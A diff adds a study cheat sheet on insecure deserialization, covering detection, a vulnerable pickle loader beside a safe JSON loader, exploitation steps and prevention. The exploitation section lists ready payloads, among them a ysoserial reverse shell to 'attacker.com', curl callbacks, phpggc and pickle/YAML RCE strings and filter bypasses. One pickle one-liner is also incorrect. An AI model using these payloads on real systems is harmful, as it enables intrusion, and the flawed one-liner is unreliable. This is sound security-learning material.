@@ -1,0 +1,266 @@
+
+# 1) what Insecure deserialization 
+
+
+	├── Definition
+	│   ├── Deserialization = converting serialized data back into objects
+	│   ├── Serialization formats:
+	│   │     ├── binary (Java .ser)
+	│   │     ├── JSON
+	│   │     ├── PHP serialized strings
+	│   │     ├── Python pickle
+	│   │     └── YAML
+	│   ├── Vulnerability occurs when:
+	│   │     ├── Attacker controls serialized input
+	│   │     └── Application automatically deserializes it
+	│   └── Consequence:
+	│         ├── Arbitrary code execution
+	│         ├── Logic corruption
+	│         ├── Privilege escalation
+	│         └── Application takeover
+	│
+	├── Why it happens
+	│   ├── Deserialization loads full object graph
+	│   ├── Constructors and magic methods run automatically
+	│   ├── Gadget chains trigger dangerous functions
+	│   └── Developers trust untrusted data
+	│
+	└── High-risk languages
+	    ├── Java
+	    ├── PHP
+	    ├── Python
+	    ├── Ruby
+	    └── .NET
+
+---------------------------------------------------------
+# 2) how to Detect 
+
+
+	
+	├── Static Analysis (source code)
+	│   ├── Java → ObjectInputStream.readObject()
+	│   ├── PHP → unserialize(), maybe __wakeup(), __destruct()
+	│   ├── Python → pickle.loads(), yaml.load()
+	│   ├── Ruby → Marshal.load()
+	│   └── .NET → BinaryFormatter.Deserialize()
+	│
+	├── Dynamic Analysis (black-box)
+	│   ├── Check cookies with long gibberish values
+	│   │     ├── Base64?
+	│   │     └── PHP serialized? (a:3:{…})
+	│   ├── Identify JWT modified → breaks → means server verifying unsafe
+	│   ├── Fuzz endpoints that accept:
+	│   │     ├── JSON objects
+	│   │     ├── file uploads
+	│   │     ├── POST body with encoded data
+	│   │     └── Remember: serialized objects often break app when modified
+	│
+	├── Behavior Indicators
+	│   ├── App crashes on modifying 1 char in cookie
+	│   ├── “Unexpected token”, “invalid object”, “cannot deserialize”
+	│   ├── Server error with stack traces referencing:
+	│   │     ├── ObjectInputStream
+	│   │     ├── pickle
+	│   │     ├── unserialize
+	│   │     └── BinaryFormatter
+	│
+	├── Testing Approaches
+	│   ├── Replace value with junk → app crashes
+	│   ├── Replace with known harmless gadget → check behavior changes
+	│   ├── Try ysoserial payloads (Java)
+	│   └── Try PHP POP chains (phpggc)
+	│
+	└── Tools
+	    ├── ysoserial (Java gadget generator)
+	    ├── phpggc (PHP gadget chains)
+	    ├── marshalsec
+	    ├── yara rules for serialization signatures
+	    └── Burp extensions (Java Deserialization Scanner)
+
+
+---------------------------------------------------------
+# 3)  Source code 
+
+BEFORE(Vuln)
+
+# vulnerable_deserialization.py
+
+import pickle
+
+def vulnerable_load(data):
+    # ❌ 100% vulnerable
+    obj = pickle.loads(data)
+    return obj
+
+if __name__ == "__main__":
+    # simulate user-controlled input
+    malicious = input("Enter base64 malicious pickle: ")
+
+    import base64
+    payload = base64.b64decode(malicious)
+
+    print("[+] Loading object...")
+    o = vulnerable_load(payload)
+    print("[+] Done:", o)
+
+--------------
+
+AFTER(SAFE)
+
+# safe_deserialization.py
+
+import json
+
+ALLOWED_KEYS = {"username", "age"}
+
+def safe_load(data):
+    try:
+        obj = json.loads(data)
+
+        # Validation
+        if not isinstance(obj, dict):
+            raise ValueError("Invalid format")
+
+        # Whitelist keys ONLY
+        for k in obj.keys():
+            if k not in ALLOWED_KEYS:
+                raise ValueError("Disallowed key: " + k)
+
+        return obj
+    except Exception as e:
+        print("[!] Blocked:", e)
+        return None
+
+if __name__ == "__main__":
+    user_input = input("JSON input: ")
+    print(safe_load(user_input))
+
+----------------
+# 4) Where to find 
+
+	
+	├── Cookies storing session object
+	│   └── Example: user_session=Tzo4OiJVc2VyU2Vzc2lvbiI6Mzp7…
+	│
+	├── Hidden JSON parameters
+	│   └── {"data":"rO0ABXNyAC5qYXZh..." }
+	│
+	├── APIs accepting arbitrary objects
+	│   └── /updateProfile
+	│
+	├── File upload containing serialized objects
+	│   └── .ser, .pickle, .php serialized arrays
+	│
+	├── JWT using alg=none or unsigned session data
+	│
+	├── Message brokers (ActiveMQ, RabbitMQ)
+	│   └── send/receive serialized Java objects
+	│
+	└── Caching systems
+	    └── Redis/Memcached storing raw serialized blobs
+
+-------------------------------------------------------
+# 5) How to exploit 
+
+	
+	├── Step 1: Identify serialization format
+	│   ├── Base64 then Java → starts with "rO0A"
+	│   ├── PHP serialized → starts with a:, O:, s:
+	│   ├── Python pickle → starts with \x80\x04
+	│   ├── Ruby Marshal → starts with \x04\x08
+	│
+	├── Step 2: Choose gadget chain
+	│   ├── Java → ysoserial
+	│   ├── PHP → phpggc
+	│   ├── Python → pickle RCE payload
+	│   ├── Ruby → Marshal.load exploit
+	│
+	├── Step 3: Generate payload
+	│   ├── Java ysoserial:
+	│   │     java -jar ysoserial.jar CommonsCollections5 "curl http://x" | base64
+	│   │
+	│   ├── PHP phpggc:
+	│   │     phpggc Laravel/RCE1 system 'id'
+	│   │
+	│   ├── Python pickle:
+	│   │     python3 -c "import pickle,os;print(pickle.dumps(os.system('id')))"
+	│
+	├── Step 4: Replace vulnerable parameter
+	│   ├── Cookie: user_session=<malicious_payload>
+	│   ├── POST body: {"data": "<payload>"}
+	│   ├── File upload: payload.ser
+	│
+	├── Step 5: Trigger deserialization
+	│   ├── Visit endpoint that reads your object
+	│   ├── Usually: /dashboard, /profile, /restore
+	│
+	├── Common Payloads
+	│   ├── Java
+	│   │     java -jar ysoserial.jar CommonsCollections1 "touch /tmp/pwn"
+	│   │     java -jar ysoserial.jar Jdk7u21 "nc attacker.com 4444 -e /bin/bash"
+	│   │     java -jar ysoserial.jar CommonsCollections5 "curl attacker"
+	│   │
+	│   ├── PHP
+	│   │     O:8:"Exploit":1:{s:4:"cmd";s:2:"id";}
+	│   │     phpggc Symfony/RCE4 assert "system('id');"
+	│   │     phpggc Laravel/RCE7 'curl attacker'
+	│   │
+	│   ├── Python
+	│   │     b"\x80\x04cos\nsystem\n(S'id')\ntR."
+	│   │     b"\x80\x04cposix\nsystem\n(S'whoami')\ntR."
+	│   │
+	│   ├── Ruby
+	│   │     Marshal.load("\x04\x08o:@Kernel\x06:\x0c@method...\x00")
+	│   │
+	│   └── YAML (Ruby/Python)
+	│         !!python/object/apply:os.system ["id"]
+	│         !!ruby/hash:Kernel { :system: "id" }
+	│
+	├── Bypass Filters
+	│   ├── Base64-wrapping the payload
+	│   ├── Compress (gzip) then Base64
+	│   ├── Put payload inside nested object
+	│   ├── Overlong Base64 variants
+	│   └── Fragment the payload with concatenation
+	│
+	└── Indicators of successful RCE
+	    ├── File creation
+	    ├── DNS callback (Burp Collaborator)
+	    ├── Blind HTTP callback
+	    └── Timing differences
+	    
+-------------------------------------------------
+
+# 6) PREVENT
+
+
+	├── Do NOT deserialize untrusted input
+	│
+	├── Use allowed-class whitelisting
+	│   └── Accept only known safe classes
+	│
+	├── Use safer formats
+	│   ├── JSON
+	│   ├── protobuf
+	│   └── XML (safe parser)
+	│
+	├── Disable dangerous magic methods
+	│   ├── PHP: avoid __wakeup(), __destruct()
+	│
+	├── Integrity + signature
+	│   └── HMAC for serialized blobs
+	│
+	├── In Java
+	│   ├── ObjectInputFilter
+	│   ├── Use Jackson for JSON
+	│
+	├── In PHP
+	│   └── Use json_decode instead of unserialize()
+	│
+	├── In Python
+	│   └── Do NOT use pickle.loads on user input
+	│
+	└── Sandbox + permissions
+	    ├── Run app as non-root
+	    ├── Limit filesystem access
+	    └── Block outbound requests
